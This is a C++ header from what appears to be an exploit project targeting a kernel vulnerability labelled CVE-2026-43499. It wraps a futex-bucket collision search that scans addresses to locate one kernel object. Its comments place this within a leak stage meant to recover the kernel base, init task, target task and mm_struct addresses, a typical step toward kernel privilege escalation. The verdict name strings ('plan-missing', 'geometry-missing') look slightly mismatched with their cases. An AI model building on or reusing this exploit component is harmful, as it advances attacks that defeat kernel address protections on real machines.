#pragma once
/** @file backend/cve_2026_43499/leak/snitch_discovery.hpp
 *  What the collision search can say by itself: one object, found or not.
 *
 *  The contract for address discovery wants four addresses together -- the kernel base, the
 *  init task, the target task and the mm_struct -- and a result that carries three of them is
 *  not a complete discovery, by that contract's own rule. What the collision search finds is
 *  one object: it walks a range and asks a rule whether each address is the thing it is
 *  looking for. Finding each of the four needs its own rule and its own range, so the honest
 *  shape for what exists today is this: a search, an answer, and no claim about the other
 *  three.
 *
 *  This is deliberately NOT an implementation of the four-field contract. Dressing one found
 *  address as a discovery would make an incomplete result pass for a complete one, which is
 *  the failure that contract exists to prevent. When the other three have rules of their own,
 *  the four together will implement it.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/leak_search.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** How a single-object search ended. */
    enum class ObjectVerdict : unsigned char {
        /** The rule accepted an address. */
        Found = 0,
        /** The range was walked and nothing answered. */
        NotFound = 1,
        /** The search could not run: its geometry or its rules were unusable. */
        Refused = 2,
    };

    [[nodiscard]] constexpr const char *object_verdict_name(ObjectVerdict verdict) noexcept {
        switch (verdict) {
            case ObjectVerdict::Found: return "ok";
            case ObjectVerdict::NotFound: return "plan-missing";
            case ObjectVerdict::Refused: return "geometry-missing";
        }
        return "unknown";
    }

    /** What one object search reports. There is no field for the other three addresses: a
     *  caller that needs them gets them from a search of their own, not from a default here. */
    struct ObjectOutcome final {
        ObjectVerdict status = ObjectVerdict::Refused;
        /** The address the rule accepted, and zero when it accepted none. */
        std::uint64_t object = 0U;
        /** How many addresses were tried. */
        std::size_t probes = 0U;
    };

    /** One object, looked for by the rule the caller brought. */
    template <FutexBuckets Buckets>
    [[nodiscard]] ObjectOutcome find_object(const ScanStrides &strides, const ScanRange &range,
                                            bool sweep_tags, const Buckets &buckets,
                                            const std::uint64_t *addresses,
                                            std::size_t address_count) noexcept {
        const SearchOutcome searched =
            search_for_object(strides, range, sweep_tags, buckets, addresses, address_count);
        ObjectOutcome outcome{};
        outcome.probes = searched.probes;
        switch (searched.status) {
            case SearchVerdict::Found:
                outcome.object = searched.found;
                outcome.status = ObjectVerdict::Found;
                return outcome;
            case SearchVerdict::NotFound:
                outcome.status = ObjectVerdict::NotFound;
                return outcome;
            case SearchVerdict::GeometryMissing:
                outcome.status = ObjectVerdict::Refused;
                return outcome;
        }
        outcome.status = ObjectVerdict::Refused;
        return outcome;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
